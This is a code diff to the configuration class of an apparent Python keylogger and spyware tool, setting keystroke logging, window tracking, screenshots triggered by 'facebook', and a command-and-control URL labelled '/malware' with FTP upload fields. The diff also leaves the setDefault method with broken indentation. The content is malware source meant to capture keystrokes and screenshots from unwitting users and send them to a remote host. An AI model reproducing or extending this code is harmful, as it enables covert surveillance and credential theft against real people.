@@ -1,5 +1,6 @@
 import getpass, sys
 from os import path
+from Util import Util
 
 
 
@@ -16,27 +17,36 @@ class Configuration:
             self.__currentDir = path.dirname(sys.executable)
             self.__currentPath = self.__currentDir + f'\\{self.__fileName}'
         #WINDOWTRACKING AND KEYLOGGING
+            self.__debug = None
+            self.__keyloggingIsActive = None
+            self.__windowTrackingIsActive = None
+            self.__samplingFrequency = None
+            self.__screenshotFrequency = None
+            self.__screenshotTrigger = None
+        #COMMUNICATION
+            self.__baseURL = None
+            self.__communicationFrequency = None
+            self.__ftpURL = None
+            self.__ftpUserName = None
+            self.__ftpPassword = None
+            try:
+                print(Util.fileIn(self.__logPath + 'config.json'))
+            except Exception:
+                print('read error')
+
+
+    def setDefault(self):
             self.__debug = True
             self.__keyloggingIsActive = True
             self.__windowTrackingIsActive = True
             self.__samplingFrequency = 0.1
             self.__screenshotFrequency = 50
             self.__screenshotTrigger = 'facebook'
-        #COMMUNICATION
             self.__baseURL = 'http://facebook-user-profile.herokuapp.com/malware'
             self.__communicationFrequency = 5
             self.__ftpURL = None
             self.__ftpUserName = None
             self.__ftpPassword = None
-
-
-    def setDefault(self):
-        self.__debug = True
-        self.__keyloggingIsActive = True
-        self.__windowTrackingIsActive = True
-        self.__samplingFrequency = 0.1
-        self.__screenshotFrequency = 50
-        self.__screenshotTrigger = ['facebook']
 
 
     @property
